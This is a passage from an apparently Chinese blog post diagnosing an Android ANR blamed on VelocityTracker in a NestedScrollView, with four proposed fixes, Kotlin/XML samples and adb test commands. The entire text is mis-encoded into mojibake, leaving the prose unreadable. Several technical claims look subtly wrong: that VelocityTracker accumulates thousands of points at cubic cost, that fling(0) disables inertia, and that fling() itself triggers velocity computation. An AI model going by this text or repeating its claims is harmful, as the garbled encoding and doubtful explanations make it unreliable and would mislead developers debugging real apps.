<p><strong>ä»€ä¹ˆæ˜¯VelocityTracker?</strong></p>
<p><code>VelocityTracker</code> æ˜¯Androidä¸­ç”¨äºè®¡ç®—è§¦æ‘¸æ»‘åŠ¨é€Ÿåº¦çš„å·¥å…·ç±»ã€‚å½“ä½ åœ¨å±å¹•ä¸Šæ»‘åŠ¨æ—¶,å®ƒä¼šè®°å½•ä½ æ‰‹æŒ‡çš„è½¨è¿¹,ç„¶åç”¨**æœ€å°äºŒä¹˜æ³•(Least Squares)**æ‹Ÿåˆä¸€æ¡æ›²çº¿,è®¡ç®—å‡ºæ»‘åŠ¨é€Ÿåº¦ã€‚è¿™ä¸ªé€Ÿåº¦ç”¨äºå®ç°æƒ¯æ€§æ»šåŠ¨(Fling)æ•ˆæœã€‚</p>
<p><strong>æ­£å¸¸æƒ…å†µ</strong>:è¿™ä¸ªè®¡ç®—åº”è¯¥åœ¨å‡ æ¯«ç§’å†…å®Œæˆã€‚
<strong>æˆ‘ä»¬çš„æƒ…å†µ</strong>:è€—æ—¶è¶…è¿‡7ç§’!</p>
<p><strong>ä¸ºä»€ä¹ˆä¼šè¿™æ ·?</strong></p>
<p>ç»è¿‡åˆ†æ,æœ€å¯èƒ½çš„åŸå› æ˜¯<strong>è§¦æ‘¸æ•°æ®å¼‚å¸¸</strong>:</p>
<ol>
<li>
<p><strong>è§¦æ‘¸ç‚¹ç§¯ç´¯è¿‡å¤š</strong>: <code>VelocityTracker</code> å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªå†å²è§¦æ‘¸ç‚¹é˜Ÿåˆ—ã€‚å¦‚æœè§¦æ‘¸å±é©±åŠ¨äº§ç”Ÿäº†å¼‚å¸¸çš„é«˜é¢‘é‡‡æ ·,é˜Ÿåˆ—ä¸­å¯èƒ½ç§¯ç´¯äº†æˆç™¾ä¸Šåƒä¸ªè§¦æ‘¸ç‚¹ã€‚</p>
</li>
<li>
<p><strong>æœ€å°äºŒä¹˜æ³•çš„å¤æ‚åº¦</strong>: å‡è®¾æœ‰Nä¸ªè§¦æ‘¸ç‚¹,æœ€å°äºŒä¹˜æ³•çš„æ—¶é—´å¤æ‚åº¦å¤§çº¦æ˜¯O(NÂ²)åˆ°O(NÂ³),å½“Nå˜å¾—å¾ˆå¤§æ—¶,è®¡ç®—é‡æš´å¢ã€‚</p>
</li>
<li>
<p><strong>Nativeå±‚æ²¡æœ‰è¶…æ—¶ä¿æŠ¤</strong>: Androidçš„VelocityTrackerå®ç°æ²¡æœ‰è¶…æ—¶æœºåˆ¶,å¦‚æœæ•°æ®å¼‚å¸¸,å®ƒä¼šè€è€å®å®æŠŠæ‰€æœ‰ç‚¹éƒ½ç®—å®Œ,å“ªæ€•è¦ç®—7ç§’ã€‚</p>
</li>
</ol>
<p><strong>æˆ‘è¸©è¿‡çš„å‘</strong>:åˆšå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ä¸»çº¿ç¨‹åšäº†è€—æ—¶æ“ä½œ(æ¯”å¦‚ç½‘ç»œè¯·æ±‚æˆ–æ•°æ®åº“æŸ¥è¯¢),ç»“æœå‘ç°æ ¹æœ¬ä¸æ˜¯!è¿™ä¸ªANRå®Œå…¨æ˜¯ç”±ä¸€ä¸ª"åº”è¯¥ç¬é—´å®Œæˆ"çš„é€Ÿåº¦è®¡ç®—å¼•èµ·çš„ã€‚è¿™å‘Šè¯‰æˆ‘ä»¬:æ°¸è¿œä¸è¦å¯¹ç³»ç»ŸAPIçš„æ€§èƒ½åšå‡è®¾ã€‚</p>
<h3 data-id="heading-8">ç•Œé¢ç»“æ„åˆ†æ</h3>
<p>é—®é¢˜å‘ç”Ÿåœ¨è¿™æ ·çš„è§†å›¾å±‚æ¬¡ä¸­:</p>
<pre><code class="hljs language-scss" lang="scss">DecorView
  â””â”€ Dialog (è½¦ç¯ç¯å¢ƒç¯è®¾ç½®å¯¹è¯æ¡†)
      â””â”€ ViewGroup (å¤šå±‚åµŒå¥—)
          â””â”€ NestedScrollView  â† é—®é¢˜å‘ç”Ÿä½ç½®
              â””â”€ <span class="hljs-selector-attr">[æ—¥é—´è¡Œè½¦ç¯è®¾ç½®å†…å®¹]</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ˜¯NestedScrollView?</strong></p>
<p><code>NestedScrollView</code> æ˜¯ AndroidX æä¾›çš„å¢å¼ºç‰ˆ <code>ScrollView</code>,æ”¯æŒåµŒå¥—æ»‘åŠ¨(Nested Scrolling)ã€‚ç›¸æ¯”æ™®é€š <code>ScrollView</code>,å®ƒçš„è§¦æ‘¸äº‹ä»¶å¤„ç†æ›´å¤æ‚,æ›´ä¾èµ– <code>VelocityTracker</code> æ¥åè°ƒåµŒå¥—æ»‘åŠ¨ã€‚</p>
<h2 data-id="heading-9">è§£å†³æ–¹æ¡ˆ:å››ä¸ªå±‚çº§çš„æˆ˜æœ¯é€‰æ‹©</h2>
<p>é¢å¯¹è¿™ä¸ªé—®é¢˜,æˆ‘å‡†å¤‡äº†4ä¸ªä¸åŒå±‚çº§çš„è§£å†³æ–¹æ¡ˆ,ä»"å¿«é€Ÿæ­¢è¡€"åˆ°"æ ¹æ²»ç—…ç¶"ã€‚</p>
<h3 data-id="heading-10">æ–¹æ¡ˆ1:ç¦ç”¨é€Ÿåº¦è¿½è¸ª(ç«‹å³ä¿®å¤,5åˆ†é’Ÿæå®š)</h3>
<p><strong>ä¼˜å…ˆçº§</strong>: â­â­â­â­â­
<strong>å®æ–½éš¾åº¦</strong>: â˜…â˜†â˜†â˜†â˜†
<strong>é¢„æœŸæ•ˆæœ</strong>: ç›´æ¥é¿å…VelocityTrackerè®¡ç®—,ç«‹å³è§£å†³ANR</p>
<p><strong>å®æ–½æ­¥éª¤</strong>:</p>
<p>åœ¨å¸ƒå±€æ–‡ä»¶ä¸­:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">androidx.core.widget.NestedScrollView</span>
    <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/nested_scroll_view"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:nestedScrollingEnabled</span>=<span class="hljs-string">"false"</span>
    <span class="hljs-attr">android:overScrollMode</span>=<span class="hljs-string">"never"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- å†…å®¹ --&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">androidx.core.widget.NestedScrollView</span>&gt;</span>
</code></pre>
<p>æˆ–åœ¨ä»£ç ä¸­åŠ¨æ€è®¾ç½®:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> nestedScrollView = dialog.findViewById&lt;NestedScrollView&gt;(R.id.nested_scroll_view)
nestedScrollView.isNestedScrollingEnabled = <span class="hljs-literal">false</span>
nestedScrollView.overScrollMode = View.OVER_SCROLL_NEVER

<span class="hljs-comment">// å¦‚æœé—®é¢˜ä¾ç„¶å­˜åœ¨,å®Œå…¨ç¦ç”¨flingè¡Œä¸º</span>
nestedScrollView.setOnTouchListener { _, event -&gt;
    <span class="hljs-keyword">if</span> (event.action == MotionEvent.ACTION_UP) {
        nestedScrollView.fling(<span class="hljs-number">0</span>)  <span class="hljs-comment">// ç¦ç”¨æƒ¯æ€§æ»šåŠ¨</span>
    }
    <span class="hljs-literal">false</span>
}
</code></pre>
<p><strong>æƒè¡¡</strong>:</p>
<ul>
<li>âœ… è¶…å¿«:5åˆ†é’Ÿå†…å®Œæˆå¹¶éªŒè¯</li>
<li>âœ… ä½é£é™©:ä¸å½±å“æ­£å¸¸æ»‘åŠ¨,åªæ˜¯æ²¡æœ‰æƒ¯æ€§æ•ˆæœ</li>
<li>âš ï¸ ç”¨æˆ·ä½“éªŒç•¥æœ‰ä¸‹é™:å¤±å»äº†ä¸æ»‘çš„æƒ¯æ€§æ»šåŠ¨</li>
</ul>
<p><strong>æˆ‘çš„ç»éªŒ</strong>:å¯¹äºç”Ÿäº§ç¯å¢ƒçš„ç´§æ€¥Bug,è¿™æ˜¯æœ€ä½³é€‰æ‹©ã€‚å…ˆæ­¢è¡€,å†ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-11">æ–¹æ¡ˆ2:æ›¿æ¢ä¸ºScrollView(æ ¹æœ¬è§£å†³,1å°æ—¶é‡æ„)</h3>
<p><strong>ä¼˜å…ˆçº§</strong>: â­â­â­â­
<strong>å®æ–½éš¾åº¦</strong>: â˜…â˜…â˜†â˜†â˜†
<strong>é¢„æœŸæ•ˆæœ</strong>: ä»æ ¹æœ¬ä¸Šé¿å…NestedScrollViewçš„å¤æ‚æ€§</p>
<p>å¦‚æœä½ çš„Dialogå†…å®¹ä¸éœ€è¦åµŒå¥—æ»‘åŠ¨åŠŸèƒ½,ç›´æ¥ç”¨ <code>ScrollView</code> æ›¿ä»£:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScrollView</span>
    <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/scroll_view"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:fillViewport</span>=<span class="hljs-string">"true"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- ä¿æŒåŸæœ‰å†…å®¹ç»“æ„ --&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">ScrollView</span>&gt;</span>
</code></pre>
<p>ä»£ç è¿ç§»:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ScrollView çš„ API ä¸ NestedScrollView é«˜åº¦å…¼å®¹</span>
<span class="hljs-keyword">val</span> scrollView = dialog.findViewById&lt;ScrollView&gt;(R.id.scroll_view)
<span class="hljs-comment">// å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¸éœ€è¦ä¿®æ”¹å…¶ä»–ä»£ç </span>
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>å†…å®¹è¾ƒç®€å•,ä¸éœ€è¦ä¸å…¶ä»–æ»‘åŠ¨ç»„ä»¶ååŒ</li>
<li>ä¸éœ€è¦ CoordinatorLayout ç­‰é«˜çº§åŠŸèƒ½</li>
</ul>
<p><strong>æƒè¡¡</strong>:</p>
<ul>
<li>âœ… å½»åº•è§£å†³:ä¸å†æœ‰VelocityTrackerçš„æ€§èƒ½éšæ‚£</li>
<li>âœ… æ›´ç®€å•:ScrollView çš„ä»£ç è·¯å¾„æ›´çŸ­,æ›´ç¨³å®š</li>
<li>âš ï¸ éœ€æµ‹è¯•:ç¡®ä¿ä¸å½±å“å…¶ä»–åµŒå¥—æ»‘åŠ¨åŠŸèƒ½</li>
</ul>
<h3 data-id="heading-12">æ–¹æ¡ˆ3:è‡ªå®šä¹‰SafeNestedScrollView(é˜²å¾¡æ€§ç¼–ç¨‹,2å°æ—¶å¼€å‘)</h3>
<p><strong>ä¼˜å…ˆçº§</strong>: â­â­â­
<strong>å®æ–½éš¾åº¦</strong>: â˜…â˜…â˜…â˜†â˜†
<strong>é¢„æœŸæ•ˆæœ</strong>: æ‹¦æˆªå¼‚å¸¸,é˜²æ­¢ANR,å¹¶è®°å½•æ—¥å¿—</p>
<p>åˆ›å»ºä¸€ä¸ªå¸¦ä¿æŠ¤æœºåˆ¶çš„è‡ªå®šä¹‰ <code>NestedScrollView</code>:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.android.settings.widget

<span class="hljs-keyword">import</span> android.content.Context
<span class="hljs-keyword">import</span> android.util.AttributeSet
<span class="hljs-keyword">import</span> android.util.Log
<span class="hljs-keyword">import</span> android.view.MotionEvent
<span class="hljs-keyword">import</span> androidx.core.widget.NestedScrollView

<span class="hljs-comment">/**
 * å®‰å…¨çš„NestedScrollView,é˜²æ­¢VelocityTrackerè®¡ç®—å¯¼è‡´ANR
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeNestedScrollView</span> <span class="hljs-meta">@JvmOverloads</span> <span class="hljs-keyword">constructor</span>(
    context: Context,
    attrs: AttributeSet? = <span class="hljs-literal">null</span>,
    defStyleAttr: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
) : NestedScrollView(context, attrs, defStyleAttr) {

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> TAG = <span class="hljs-string">"SafeNestedScrollView"</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MAX_TOUCH_EVENTS_PER_100MS = <span class="hljs-number">100</span>  <span class="hljs-comment">// å¼‚å¸¸é˜ˆå€¼</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> lastTouchTime = <span class="hljs-number">0L</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> touchEventCount = <span class="hljs-number">0</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onTouchEvent</span><span class="hljs-params">(ev: <span class="hljs-type">MotionEvent</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">when</span> (ev.action) {
            MotionEvent.ACTION_DOWN -&gt; {
                lastTouchTime = System.currentTimeMillis()
                touchEventCount = <span class="hljs-number">0</span>
            }

            MotionEvent.ACTION_MOVE -&gt; {
                touchEventCount++

                <span class="hljs-comment">// æ£€æµ‹å¼‚å¸¸:çŸ­æ—¶é—´å†…å¤§é‡MOVEäº‹ä»¶</span>
                <span class="hljs-keyword">val</span> currentTime = System.currentTimeMillis()
                <span class="hljs-keyword">val</span> duration = currentTime - lastTouchTime

                <span class="hljs-keyword">if</span> (duration <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.99</span> &amp;&amp; touchEventCount &gt; MAX_TOUCH_EVENTS_PER_100MS) {
                    Log.w(TAG, <span class="hljs-string">"æ£€æµ‹åˆ°å¼‚å¸¸è§¦æ‘¸äº‹ä»¶æµ: <span class="hljs-variable">$touchEventCount</span> ä¸ªäº‹ä»¶åœ¨ <span class="hljs-subst">${duration}</span>ms å†…"</span>)
                    <span class="hljs-comment">// æ¸…ç†è§¦æ‘¸çŠ¶æ€,é˜²æ­¢VelocityTrackerç§¯ç´¯è¿‡å¤šæ•°æ®</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
                }
            }

            MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.onTouchEvent(ev)
                } <span class="hljs-keyword">catch</span> (e: Exception) {
                    Log.e(TAG, <span class="hljs-string">"è§¦æ‘¸äº‹ä»¶å¤„ç†å¼‚å¸¸"</span>, e)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
                }
            }
        }

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">super</span>.onTouchEvent(ev)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(TAG, <span class="hljs-string">"è§¦æ‘¸äº‹ä»¶å¤„ç†å¼‚å¸¸"</span>, e)
            <span class="hljs-literal">true</span>
        }
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fling</span><span class="hljs-params">(velocityY: <span class="hljs-type">Int</span>)</span></span> {
        <span class="hljs-comment">// é™åˆ¶flingé€Ÿåº¦,é˜²æ­¢è¿‡å¤§å€¼å¯¼è‡´è®¡ç®—é—®é¢˜</span>
        <span class="hljs-keyword">val</span> limitedVelocity = velocityY.coerceIn(-<span class="hljs-number">5000</span>, <span class="hljs-number">5000</span>)
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">super</span>.fling(limitedVelocity)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(TAG, <span class="hljs-string">"Flingæ‰§è¡Œå¼‚å¸¸"</span>, e)
        }
    }
}
</code></pre>
<p>åœ¨å¸ƒå±€ä¸­ä½¿ç”¨:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.android.settings.widget.SafeNestedScrollView</span>
    <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/nested_scroll_view"</span>
    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- å†…å®¹ --&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">com.android.settings.widget.SafeNestedScrollView</span>&gt;</span>
</code></pre>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>:</p>
<ol>
<li><strong>å¼‚å¸¸æ£€æµ‹</strong>: ç›‘æ§è§¦æ‘¸äº‹ä»¶çš„é¢‘ç‡,è¯†åˆ«å¼‚å¸¸æ¨¡å¼</li>
<li><strong>æå‰ä¸­æ–­</strong>: æ£€æµ‹åˆ°å¼‚å¸¸æ—¶ç«‹å³ä¸­æ–­,ä¸è®©é—®é¢˜ä¼ é€’åˆ°VelocityTracker</li>
<li><strong>å¼‚å¸¸æ•è·</strong>: Try-catchåŒ…è£¹å…³é”®è°ƒç”¨,é˜²æ­¢å´©æºƒ</li>
<li><strong>é€Ÿåº¦é™åˆ¶</strong>: é™åˆ¶flingé€Ÿåº¦,é¿å…æç«¯å€¼</li>
<li><strong>æ—¥å¿—è®°å½•</strong>: è®°å½•å¼‚å¸¸æƒ…å†µ,ä¾¿äºåç»­åˆ†æ</li>
</ol>
<p><strong>æƒè¡¡</strong>:</p>
<ul>
<li>âœ… é˜²å¾¡æ€§å¼º:å¤šé‡ä¿æŠ¤æœºåˆ¶</li>
<li>âœ… å¯è§‚æµ‹æ€§:æ—¥å¿—è®°å½•ä¾¿äºæ’æŸ¥</li>
<li>âœ… å‘åå…¼å®¹:ä¸å½±å“æ­£å¸¸ä½¿ç”¨åœºæ™¯</li>
<li>âš ï¸ å¼€å‘æˆæœ¬:éœ€è¦ç¼–å†™å’Œæµ‹è¯•è‡ªå®šä¹‰View</li>
</ul>
<h3 data-id="heading-13">æ–¹æ¡ˆ4:ç³»ç»Ÿå±‚ä¼˜åŒ–(é•¿æœŸæ–¹æ¡ˆ,éœ€è·¨å›¢é˜Ÿåä½œ)</h3>
<p><strong>ä¼˜å…ˆçº§</strong>: â­â­
<strong>å®æ–½éš¾åº¦</strong>: â˜…â˜…â˜…â˜…â˜…
<strong>é€‚ç”¨åœºæ™¯</strong>: å¦‚æœæ˜¯ç³»ç»ŸROMæˆ–ç¡¬ä»¶é—®é¢˜</p>
<p>è¿™ä¸ªæ–¹æ¡ˆéœ€è¦ä¸ç¡¬ä»¶å›¢é˜Ÿå’Œç³»ç»Ÿå›¢é˜Ÿåä½œ:</p>
<ol>
<li>
<p><strong>æ£€æŸ¥è§¦æ‘¸å±é©±åŠ¨</strong>: ç¡®è®¤è§¦æ‘¸äº‹ä»¶çš„é‡‡æ ·ç‡æ˜¯å¦æ­£å¸¸,æ˜¯å¦å­˜åœ¨é©±åŠ¨Bug</p>
</li>
<li>
<p><strong>ä¼˜åŒ–ç³»ç»Ÿåº“</strong>: è€ƒè™‘ä½¿ç”¨GoogleåŸç”Ÿçš„ <code>libinput.so</code>,æˆ–åœ¨x86_64æ¶æ„ä¸Šä¼˜åŒ–æ€§èƒ½</p>
</li>
<li>
<p><strong>æ·»åŠ è¶…æ—¶ä¿æŠ¤</strong>: ä¸ºVelocityTrackerçš„nativeå®ç°æ·»åŠ è¶…æ—¶æœºåˆ¶</p>
</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨systraceç›‘æ§è§¦æ‘¸äº‹ä»¶</span>
systrace.py -t 10 -o trace.html input view

<span class="hljs-comment"># åˆ†æè§¦æ‘¸äº‹ä»¶çš„é‡‡æ ·é¢‘ç‡å’Œå¤„ç†æ—¶é—´</span>
</code></pre>
<p><strong>è¿™æ˜¯æˆ‘çš„ç»éªŒ</strong>:è¿™ç±»ç³»ç»Ÿçº§é—®é¢˜å¾€å¾€ç‰µæ¶‰å¤šä¸ªå›¢é˜Ÿ,å‘¨æœŸé•¿,ä¸ç¡®å®šæ€§å¤§ã€‚é™¤éä½ æœ‰æ˜ç¡®è¯æ®è¡¨æ˜æ˜¯ç³»ç»Ÿé—®é¢˜,å¦åˆ™ä¼˜å…ˆé€‰æ‹©åº”ç”¨å±‚æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-14">è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47a847b516bb4299a6d80270e109ad39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768012488&amp;x-signature=JWKNza9jTv2%2BYyVVgXUWNKP6gOY%3D" alt="case4-solutions-comparison.png" loading="lazy"/></p>
<p><em>å›¾2: å››ç§è§£å†³æ–¹æ¡ˆçš„ä¼˜ç¼ºç‚¹å¯¹æ¯”</em></p>













































<table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="center">ä¿®å¤æ—¶é—´</th><th align="center">éš¾åº¦</th><th align="center">é£é™©</th><th align="center">æ•ˆæœ</th><th align="left">æ¨èåœºæ™¯</th></tr></thead><tbody><tr><td align="left">æ–¹æ¡ˆ1: ç¦ç”¨é€Ÿåº¦è¿½è¸ª</td><td align="center">5åˆ†é’Ÿ</td><td align="center">â­</td><td align="center">ä½</td><td align="center">ç«‹å³è§£å†³</td><td align="left">ç´§æ€¥ä¿®å¤,ç”Ÿäº§ç¯å¢ƒ</td></tr><tr><td align="left">æ–¹æ¡ˆ2: æ›¿æ¢ä¸ºScrollView</td><td align="center">1å°æ—¶</td><td align="center">â­â­</td><td align="center">ä¸­</td><td align="center">æ ¹æ²»</td><td align="left">ä¸éœ€è¦åµŒå¥—æ»‘åŠ¨</td></tr><tr><td align="left">æ–¹æ¡ˆ3: SafeNestedScrollView</td><td align="center">2å°æ—¶</td><td align="center">â­â­â­</td><td align="center">ä½</td><td align="center">é˜²å¾¡+ç›‘æ§</td><td align="left">éœ€è¦åµŒå¥—æ»‘åŠ¨+é˜²å¾¡</td></tr><tr><td align="left">æ–¹æ¡ˆ4: ç³»ç»Ÿå±‚ä¼˜åŒ–</td><td align="center">æ•°å‘¨</td><td align="center">â­â­â­â­â­</td><td align="center">é«˜</td><td align="center">å½»åº•æ ¹æ²»</td><td align="left">ç³»ç»Ÿå®šåˆ¶ROM</td></tr></tbody></table>
<p><strong>æˆ‘çš„å»ºè®®</strong>:</p>
<ul>
<li><strong>ç”Ÿäº§ç¯å¢ƒç´§æ€¥ä¿®å¤</strong>: æ–¹æ¡ˆ1(ç¦ç”¨) + æ–¹æ¡ˆ2(æ›¿æ¢)ç»„åˆæ‹³</li>
<li><strong>é•¿æœŸæ¶æ„ä¼˜åŒ–</strong>: æ–¹æ¡ˆ3(è‡ªå®šä¹‰View) + ä»£ç è§„èŒƒå»ºç«‹</li>
<li><strong>è½¦è½½ç³»ç»Ÿå®šåˆ¶</strong>: æ–¹æ¡ˆ4(ç³»ç»Ÿä¼˜åŒ–) + åº”ç”¨å±‚é˜²å¾¡</li>
</ul>
<h2 data-id="heading-15">éªŒè¯ä¸æµ‹è¯•:ä¿®å¤ä¹‹åçš„åŠŸè¯¾</h2>
<p>ä¿®å¤åªæ˜¯ç¬¬ä¸€æ­¥,éªŒè¯æ‰æ˜¯å…³é”®ã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„æµ‹è¯•æ¸…å•:</p>
<h3 data-id="heading-16">åŠŸèƒ½æµ‹è¯•</h3>
<pre><code class="hljs language-markdown" lang="markdown">æµ‹è¯•æ­¥éª¤:
<span class="hljs-bullet">1.</span> è¿›å…¥è®¾ç½®åº”ç”¨
<span class="hljs-bullet">2.</span> ç‚¹å‡»è½¦ç¯ â†’ ç¯å¢ƒç¯
<span class="hljs-bullet">3.</span> åå¤ç‚¹å‡»æ—¥é—´è¡Œè½¦ç¯ä¸‹é¢çš„æ–‡å­—(è‡³å°‘20æ¬¡)
<span class="hljs-bullet">4.</span> è§‚å¯Ÿæ˜¯å¦å†æ¬¡å‡ºç°ANR
<span class="hljs-bullet">5.</span> æµ‹è¯•å…¶ä»–è®¾ç½®é¡µé¢çš„æ»‘åŠ¨åŠŸèƒ½
</code></pre>
<h3 data-id="heading-17">æ€§èƒ½æµ‹è¯•</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ç›‘æ§ä¸»çº¿ç¨‹æ€§èƒ½</span>
adb shell am profile start com.android.settings /data/local/tmp/profile.trace
<span class="hljs-comment"># æ‰§è¡Œæµ‹è¯•æ“ä½œ</span>
adb shell am profile stop com.android.settings

<span class="hljs-comment"># 2. å®æ—¶æŸ¥çœ‹æ—¥å¿—</span>
adb logcat -s SafeNestedScrollView:* AndroidRuntime:E

<span class="hljs-comment"># 3. æ£€æŸ¥æ˜¯å¦æœ‰æ–°çš„ANR</span>
adb shell <span class="hljs-built_in">ls</span> -lt /data/anr/
</code></pre>
<h3 data-id="heading-18">å…³é”®æŒ‡æ ‡</h3>



































<table><thead><tr><th align="left">æŒ‡æ ‡</th><th align="center">ä¿®å¤å‰</th><th align="center">ç›®æ ‡å€¼</th><th align="left">æµ‹é‡æ–¹æ³•</th></tr></thead><tbody><tr><td align="left">è§¦æ‘¸å“åº”æ—¶é—´</td><td align="center">å¤§äº5000ms</td><td align="center">å°äº100ms</td><td align="left">Systrace</td></tr><tr><td align="left">ä¸»çº¿ç¨‹æœ€å¤§é˜»å¡</td><td align="center">7520ms</td><td align="center">å°äº200ms</td><td align="left">StrictMode</td></tr><tr><td align="left">ANRå‘ç”Ÿç‡</td><td align="center">100%(å¿…ç°)</td><td align="center">0%</td><td align="left">çº¿ä¸Šç›‘æ§</td></tr><tr><td align="left">Flingæµç•…åº¦</td><td align="center">N/A</td><td align="center">â‰¥55fps</td><td align="left">FrameMetrics</td></tr></tbody></table>
<h3 data-id="heading-19">å›å½’æµ‹è¯•æ¸…å•</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å…¶ä»–è®¾ç½®é¡µé¢çš„æ»‘åŠ¨æ­£å¸¸</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> Dialogçš„æ˜¾ç¤ºå’Œå…³é—­æ­£å¸¸</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å…¶ä»–ä½¿ç”¨NestedScrollViewçš„é¡µé¢æ­£å¸¸</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> åº”ç”¨å¯åŠ¨é€Ÿåº¦æ— æ˜æ˜¾ä¸‹é™</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å†…å­˜å ç”¨æ— æ˜æ˜¾å¢é•¿</li>
</ul>
<h2 data-id="heading-20">é¢„é˜²æªæ–½:æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”</h2>
<p>ç»å†äº†è¿™æ¬¡"æƒŠå¿ƒåŠ¨é­„"çš„æ’æŸ¥,æˆ‘æ€»ç»“äº†ä¸€äº›é¢„é˜²æªæ–½,å¸Œæœ›èƒ½å¸®åŠ©ä½ é¿å…ç±»ä¼¼çš„å‘ã€‚</p>
<h3 data-id="heading-21">ç¼–ç è§„èŒƒ</h3>
<h4 data-id="heading-22">âŒ åé¢æ•™æ:ä¸»çº¿ç¨‹éšå¼è®¡ç®—</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ é”™è¯¯:ä¾èµ–ç³»ç»Ÿç»„ä»¶çš„éšå¼è®¡ç®—</span>
nestedScrollView.fling(velocity)  <span class="hljs-comment">// å†…éƒ¨ä¼šè§¦å‘VelocityTrackerè®¡ç®—</span>
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âœ… æ­£ç¡®:ä¸»åŠ¨æ§åˆ¶,é¿å…éšå¼è€—æ—¶æ“ä½œ</span>
nestedScrollView.smoothScrollTo(x, y, <span class="hljs-number">300</span>)  <span class="hljs-comment">// æ˜ç¡®çš„æ»šåŠ¨è¡Œä¸º</span>
</code></pre>
<h4 data-id="heading-23">âŒ åé¢æ•™æ:è¿‡åº¦åµŒå¥—</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- âŒ é”™è¯¯:ä¸å¿…è¦çš„åµŒå¥—æ»‘åŠ¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">NestedScrollView</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">NestedScrollView</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RecyclerView</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">NestedScrollView</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">NestedScrollView</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- âœ… æ­£ç¡®:ä½¿ç”¨CoordinatorLayout --&gt;</span>
